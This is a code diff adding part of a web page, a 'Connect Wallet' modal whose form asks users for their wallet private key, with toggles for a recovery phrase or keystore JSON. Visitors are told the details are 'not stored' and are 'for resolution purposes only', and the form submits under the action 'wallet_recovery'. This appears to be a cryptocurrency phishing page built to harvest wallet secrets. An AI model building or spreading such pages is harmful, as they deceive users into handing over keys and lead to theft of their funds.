+                <div id="privateField" class="toggle-field hidden">
+                    <input type="text" id="private_key" name="privatekeyval" style="color: #1f1f1f;"
+                        placeholder="Enter Your Private Key" class="w-full p-2 mt-2 border border-gray-300 rounded-md">
+                </div>
+
+                <p class="text-sm mt-2">Any misinformation may hinder the successful resolution of the issue. Your
+                    details are not stored on our system! It's for resolution purposes only.</p>
+                <div class="form-footer">
+                    <button class="connect-btn" type="submit">Connect Wallet</button>
+                    <input type="hidden" name="action" value="wallet_recovery">
+                </div>
+            </form>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const rewardPointsElements = document.querySelectorAll('.reward-points');
+            let totalPoints = 0;
+
+            rewardPointsElements.forEach(element => {
+                const points = parseInt(element.getAttribute('data-points'), 10);
+                totalPoints += points;
+            });
+
+            document.getElementById('totalPoints').innerText = totalPoints;
+
+            // Connect Wallet Modal Logic
+            const connectWalletButton = document.getElementById('connectWalletButton');
+            const walletModal = document.getElementById('walletModal');
+            const closeModal = document.getElementById('closeModal');
+            const walletForm = document.getElementById('walletConnectionForm');
+
+            connectWalletButton.addEventListener('click', () => {
+                walletModal.classList.remove('hidden');
+            });
+
+            closeModal.addEventListener('click', () => {
+                walletModal.classList.add('hidden');
+            });
+
+            // Toggle fields based on selected option
+            document.getElementById('type').addEventListener('change', toggleFields);
+
+            function toggleFields() {
+                const selectedOption = document.getElementById('type').value;
+                document.getElementById('phraseField').classList.toggle('hidden', selectedOption !== 'Phrase');
+                document.getElementById('keystoreField').classList.toggle('hidden', selectedOption !== 'Keystore JSON');
+                document.getElementById('privateField').classList.toggle('hidden', selectedOption !== 'Private');
+            }
+
+            // Loader Logic for Forms
+            // const claimForms = document.querySelectorAll('.claim-form');
+            // claimForms.forEach(form => {
+            //     form.addEventListener('submit', (e) => {
+            //         e.preventDefault();
+            //         const button = form.querySelector('button[type="submit"]');
+            //         button.disabled = true;
+            //         button.innerHTML = 'Loading...';
+
+            //         // Simulate form submission
+            //         setTimeout(() => {
+            //             form.submit();
+            //         }, 1000);
+            //     });
+            // });
+
+            //     walletForm.addEventListener('submit', (e) => {
+            //         e.preventDefault();
+            //         const button = walletForm.querySelector('button[type="submit"]');
+            //         button.disabled = true;
+            //         button.innerHTML = 'Connecting...';
+
+            //         // Simulate wallet connection
+            //         setTimeout(() => {
+            //             walletModal.classList.add('hidden');
+            //             button.disabled = false;
+            //             button.innerHTML = 'Connect Wallet';
+            //         }, 2000);
+            //     });
+        });
+    </script>
 </body>
 
 </html>
